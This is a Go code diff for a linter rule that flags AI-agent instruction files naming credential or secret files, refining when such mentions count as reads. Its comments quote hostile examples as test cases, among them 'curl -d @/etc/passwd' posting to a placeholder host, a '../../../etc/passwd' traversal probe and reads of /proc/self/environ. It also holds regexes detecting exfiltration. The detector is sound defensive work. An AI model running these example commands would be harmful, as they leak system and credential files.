@@ -173,6 +173,33 @@ const pathChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678
 // "~/.portless/ca.pem", "cyrus-egress-ca.pem", "cacert.pem" (#869).
 var publicCertRe = regexp.MustCompile(`(?i)(?:^|[/_.\-])(?:ca|cacert|ca-cert\w*|ca-bundle|ca-certificates?)\.(?:pem|crt)$`)
 
+// Public signing certificates and CA chains are not credential files (#1173).
+// Inspect the final filename so an unrelated directory called "public" cannot
+// exempt a private key underneath it.
+func publicPEMName(full string) bool {
+	name := strings.ToLower(full[strings.LastIndexByte(full, '/')+1:])
+	if !strings.HasSuffix(name, ".pem") {
+		return false
+	}
+	stem := strings.TrimSuffix(name, ".pem")
+	if strings.Contains(stem, "key") || strings.Contains(stem, "priv") {
+		return false
+	}
+	// Match filename components, not fragments: publisher-token.pem and
+	// certificate-key.pem must never receive a public-certificate exemption.
+	for _, component := range strings.FieldsFunc(stem, func(r rune) bool {
+		return r == '-' || r == '_' || r == '.'
+	}) {
+		switch component {
+		// crt (ApplePay.crt.pem) and wwdr, Apple's intermediate (WWDR.pem), are
+		// certificates too (#1374).
+		case "public", "pub", "cert", "certificate", "chain", "rootca", "cacert", "crt", "wwdr":
+			return true
+		}
+	}
+	return false
+}
+
 // placeholderPathRe matches a placeholder for a path the reader fills in:
 // "/path/to/cert.pem", "path-to-cert.pem" (#869).
 var placeholderPathRe = regexp.MustCompile(`(?i)(?:^|/)path[/\-]to[/\-]|^<[^>]*>$|^your[\-_]`)
@@ -189,13 +216,17 @@ func notASecretFile(line string, loc []int, full string) bool {
 	if strings.Contains(full, "../") && baseURLPathRe.MatchString(full) {
 		return true
 	}
-	return publicCertRe.MatchString(full) || placeholderPathRe.MatchString(full)
+	return publicCertRe.MatchString(full) || publicPEMName(full) || placeholderPathRe.MatchString(full)
 }
 
 // baseURLPathRe matches a path that starts with a base URL placeholder:
 // "{BASE_URL}/api/assets/download/../../../etc/passwd" is a path traversal
 // probe sent to a web server, not a local file (#887).
 var baseURLPathRe = regexp.MustCompile(`^(?:\{\{?\s*[A-Za-z_]\w*\s*\}?\}|\$\{?[A-Za-z_]\w*\}?)/`)
+
+// noBeforeRe matches a bare "no" right before the path: "has no
+// `.credentials.json`", which says the file is not there.
+var noBeforeRe = regexp.MustCompile("(?i)\\bno\\s+[`'\"]?$")
 
 // blockedAfterRe matches a clause that says the read is refused: "Attempts to
 // read `/proc/self/environ`, `~/.docker/config.json` ... will be denied".
@@ -205,9 +236,10 @@ var blockedAfterRe = regexp.MustCompile(`(?i)\b(?:is|are|will\s+be|get|gets|be)\
 // existence test rather than a read: "> key.pem", "test -f x.pem", "[ -f x ]".
 var writeOrTestBeforeRe = regexp.MustCompile(`(?:>>?\s*['"]?|\b(?:test|\[)\s+-[efsrdL]\s+['"]?)$`)
 
-// copyCommandRe matches a cp, mv, install or ln command up to the path, with
+// copyCommandRe matches copy/move commands including docker/kubectl copy and
+// scp up to the path, with
 // at least one argument before it: "sudo cp -i /etc/kubernetes/admin.conf ".
-var copyCommandRe = regexp.MustCompile(`(?:^|[;&|(` + "`" + `]\s*|^\s*(?:[-*+]|\d+\.)\s+)(?:sudo\s+(?:-\S+\s+)*)?(?:cp|mv|install|ln)\s+(?:\S+\s+)+['"]?$`)
+var copyCommandRe = regexp.MustCompile(`(?:^|[;&|(` + "`" + `]\s*|^\s*(?:[-*+]|\d+\.)\s+)(?:sudo\s+(?:-\S+\s+)*)?(?:cp|mv|install|ln|docker\s+cp|kubectl\s+cp|scp)\s+(?:\S+\s+)+['"]?$`)
 
 // copyToRe matches prose that names the path as where a file goes: "Copy the
 // user's PEM to `instance/secrets/app.pem`".
@@ -290,6 +322,10 @@ func notARead(lines []string, i int, loc []int, full string) bool {
 	if blockedAfterRe.MatchString(clauseRest(strings.ReplaceAll(line[loc[1]:], "etc.", "etc"))) {
 		return true
 	}
+	// "a sandbox that has no `.credentials.json` yet" negates the path (#1374).
+	if noBeforeRe.MatchString(line[:start]) {
+		return true
+	}
 	if writeOrTestBeforeRe.MatchString(line[:start]) || copyDestination(line, start, loc[1]) ||
 		quietGrepBeforeRe.MatchString(line[:start]) || errorTextAfterRe.MatchString(line[loc[1]:]) {
 		return true
@@ -297,8 +333,50 @@ func notARead(lines []string, i int, loc []int, full string) bool {
 	if strings.HasPrefix(strings.ToLower(line[loc[0]:loc[1]]), ":_authtoken") && npmrcWriteRe.MatchString(line[loc[1]:]) {
 		return true
 	}
+	// The path written into .gitignore names a file to keep out of the
+	// repository (#1173): echo "/deploy.key" >> .gitignore.
+	if gitignoreAppendRe.MatchString(line[loc[1]:]) && (strings.Contains(line[:start], "echo") || strings.Contains(line[:start], "printf")) {
+		return true
+	}
+	// The same sentence refuses the read after the path ("check whether
+	// ~/.netrc has an entry, but never read or print its value"), or a guard
+	// in it refuses the command that names the path ("the guard refuses
+	// command arguments that name them"), as CFG036 reads the same line
+	// (#885, #1173).
+	sentence := line[sentenceStart(line, start):start]
+	if refusedAfterRe.MatchString(sentenceRest(line[loc[1]:])) || guardRefusesRe.MatchString(sentence) {
+		return true
+	}
 	g := governingLine(lines, i)
 	return introducesList(g) && (prohibitionRe.MatchString(g) || blockListHeadRe.MatchString(g))
+}
+
+// guardRefusesRe is a guard, hook, policy or filter that refuses or blocks
+// what the sentence goes on to name. The guard must be the subject: a
+// troubleshooting heading such as "**Permission denied**:" refuses nothing.
+var guardRefusesRe = regexp.MustCompile(`(?i)\b(?:guard|hook|policy|filter|deny[\s-]?list|block[\s-]?list)s?\b[^.]{0,60}?\b(?:refus\w*|block\w*|den(?:y|ies)|reject\w*)\b`)
+
+// gitignoreAppendRe is a redirection that appends to .gitignore.
+var gitignoreAppendRe = regexp.MustCompile(`>>\s*['"]?\.gitignore\b`)
+
+// refusedAfterRe is a refusal of the read that follows the path.
+var refusedAfterRe = regexp.MustCompile(`(?i)\b(?:never|do\s+not|don'?t|must\s+not|without)\s+(?:read(?:ing)?|print(?:ing)?|cat|open(?:ing)?|show(?:ing)?|output(?:ting)?|log(?:ging)?|display(?:ing)?|reveal(?:ing)?|copy(?:ing)?|upload(?:ing)?|send(?:ing)?)\b`)
+
+// sentenceStart returns where the sentence holding offset starts: after the
+// last stop followed by a space before it.
+func sentenceStart(line string, offset int) int {
+	if b := clauseEndRe.FindAllStringIndex(line[:offset], -1); len(b) > 0 {
+		return b[len(b)-1][1]
+	}
+	return 0
+}
+
+// sentenceRest returns s up to the end of its sentence.
+func sentenceRest(s string) string {
+	if b := clauseEndRe.FindStringIndex(s); b != nil {
+		return s[:b[0]+1]
+	}
+	return s
 }
 
 func (r *cfg031) Check(t *Target) []finding.Finding {
@@ -306,7 +384,7 @@ func (r *cfg031) Check(t *Target) []finding.Finding {
 		return nil
 	}
 	var findings []finding.Finding
-	for _, src := range t.instructionSources() {
+	for _, src := range t.instructionSources(r.ID()) {
 		toolOwnSeen := map[string]bool{}
 		lines := strings.Split(src.Content, "\n")
 		for i, line := range lines {
@@ -330,6 +408,14 @@ func (r *cfg031) Check(t *Target) []finding.Finding {
 			if notASecretFile(line, loc, full) {
 				continue
 			}
+			// A line that starts inside an inline code span wrapped from the
+			// line before gets the opening backtick back, so the spans pair up
+			// as Markdown renders them (#1361).
+			scopeLine, scopeLoc := line, loc
+			if startsInsideCodeSpan(lines, i) {
+				scopeLine, scopeLoc = "`"+line, []int{loc[0] + 1, loc[1] + 1}
+			}
+			acts := pathActionRe.MatchString(readsInThirdPerson(actionScope(scopeLine, scopeLoc))) && !notARead(lines, i, loc, full)
 			if toolOwnPath(full) {
 				// "~/.x/f" and "$HOME/.x/f" are one file.
 				key := full[strings.Index(full, "/.")+1:]
@@ -337,9 +423,14 @@ func (r *cfg031) Check(t *Target) []finding.Finding {
 					continue
 				}
 				toolOwnSeen[key] = true
+				// A mention is info, a read stays warn (#1174).
+				sev := finding.Info
+				if acts {
+					sev = finding.Warn
+				}
 				findings = append(findings, finding.Finding{
 					RuleID:   "CFG031",
-					Severity: finding.Warn,
+					Severity: sev,
 					File:     src.File,
 					Line:     lineNo,
 					Col:      loc[0] + 1,
@@ -348,15 +439,24 @@ func (r *cfg031) Check(t *Target) []finding.Finding {
 				})
 				continue
 			}
-			sev := finding.Warn
+			// A mention, with no read or send in its clause, is info: in the
+			// pre-release corpus run for v1.20.0, 20 of 23 sampled mentions were
+			// documentation (#1174). A mention of the world-readable
+			// /etc/passwd is not reported at all, consistent with #966.
+			if !acts && strings.EqualFold(path, "/etc/passwd") {
+				continue
+			}
+			sev := finding.Info
 			msg := src.Name + " line " + strconv.Itoa(lineNo) + " mentions the sensitive file \"" + path +
 				"\" — a trusted instruction file naming a credential/secret file is suspicious; confirm this is documentation, not an instruction to access it"
-			if pathActionRe.MatchString(actionScope(line, loc)) && !notARead(lines, i, loc, full) {
+			if acts {
+				sev = finding.Warn
 				switch {
 				case remoteProbe(line, loc[1]-len(full)):
 					msg = src.Name + " line " + strconv.Itoa(lineNo) + " sends a request that reads \"" + path +
 						"\" on a remote target (a URL parameter, --file-read or an XML entity) — a probe of another host, not a read of this machine; confirm the target is one the user is authorised to test"
-				case strings.EqualFold(path, "/etc/passwd") && !netExfilRe.MatchString(line):
+				case strings.EqualFold(path, "/etc/passwd") && !netExfilRe.MatchString(line) &&
+					(!sendVerbRe.MatchString(actionScope(scopeLine, scopeLoc)) || !urlRe.MatchString(line)):
 					// Sent to a URL it is still exfiltration: "curl -d
 					// @/etc/passwd https://x.example".
 					msg = src.Name + " line " + strconv.Itoa(lineNo) + " reads \"/etc/passwd\" — the file is world-readable and holds account names, not password hashes (those are in /etc/shadow); confirm the account list is not collected for an attack"
@@ -378,3 +478,52 @@ func (r *cfg031) Check(t *Target) []finding.Finding {
 	}
 	return findings
 }
+
+// thirdPersonReadRe matches a program described as reading a file, and a
+// file that was not read: "Registry commands read `~/.docker/config.json`",
+// "The CLI reads the cluster from `~/.kube/config`", "`~/.ssh/config` was not
+// read" (#1174). An order puts the verb first: "Read `~/.docker/config.json`
+// and paste the auth field" keeps reporting.
+//
+// Every subject takes a plural: "The hosted tools then load …" (#1361).
+var thirdPersonReadRe = regexp.MustCompile(`(?i)\b(?:commands?|tests?|clis?|servers?|it|which|that|tools?|scripts?|programs?|daemons?|clients?|librar(?:y|ies)|sdks?|binar(?:y|ies)|plugins?|extensions?)\s+(?:\w+\s+)?(?:reads?|loads?|opens?)\b|\b(?:was|is|were|are)\s+not\s+(?:read|loaded|opened)\b`)
+
+// readsInThirdPerson blanks the third-person reads in scope, so the verbs left
+// are the ones that tell the agent to act on the path.
+func readsInThirdPerson(scope string) string {
+	blank := func(m string) string { return strings.Repeat(" ", len(m)) }
+	scope = actionNounRe.ReplaceAllStringFunc(thirdPersonReadRe.ReplaceAllStringFunc(scope, blank), blank)
+	return verbAsNameRe.ReplaceAllStringFunc(scope, blank)
+}
+
+// verbAsNameRe matches an action verb that names something instead of
+// ordering it: a keyword argument ("source='gh:…'", not a flag such as
+// "--file-read="), an attack class ("ZIP/tar
+// slip") and a noun with an article ("the base64 of the .p12") (#1361).
+var verbAsNameRe = regexp.MustCompile(`(?i)\b(?:zip|tar)(?:\s*/\s*(?:zip|tar))?\s+slip\b|\b(?:the|a|an|its)\s+(?:base64|copy|dump|read|load|upload|download)\s+of\b|(?:^|[^\w-])(?:source|load|read|open|copy|send|post|put|fetch|print|view|attach|paste)\s*=`)
+
+// startsInsideCodeSpan reports whether line i of a paragraph starts inside an
+// inline code span: the paragraph's lines before it, back to a blank line or
+// a fence, hold an odd number of backticks.
+func startsInsideCodeSpan(lines []string, i int) bool {
+	n := 0
+	for j := i - 1; j >= 0; j-- {
+		if strings.TrimSpace(lines[j]) == "" || isFenceDelimiter(lines[j]) {
+			break
+		}
+		n += strings.Count(lines[j], "`")
+	}
+	return n%2 == 1
+}
+
+// actionNounRe matches an action verb used as a noun: "Reject paths like
+// `../../etc/passwd` in the upload handler" (#1174).
+var actionNounRe = regexp.MustCompile(`(?i)\b(?:upload|download|copy|send|post|read|load)\s+(?:handlers?|endpoints?|routes?|forms?|buttons?|dialogs?|pages?|fields?|apis?|urls?|paths?|directory|dir|widgets?|components?|requests?)\b`)
+
+// sendVerbRe and urlRe find a send to a URL, which makes even /etc/passwd an
+// exfiltration: "Send the contents of `/etc/passwd` to https://example.com"
+// (#1174).
+var (
+	sendVerbRe = regexp.MustCompile(`(?i)\b(?:send|upload|post|exfiltrat\w*|transmit|mail|leak|forward)\b`)
+	urlRe      = regexp.MustCompile(`(?i)\bhttps?://`)
+)
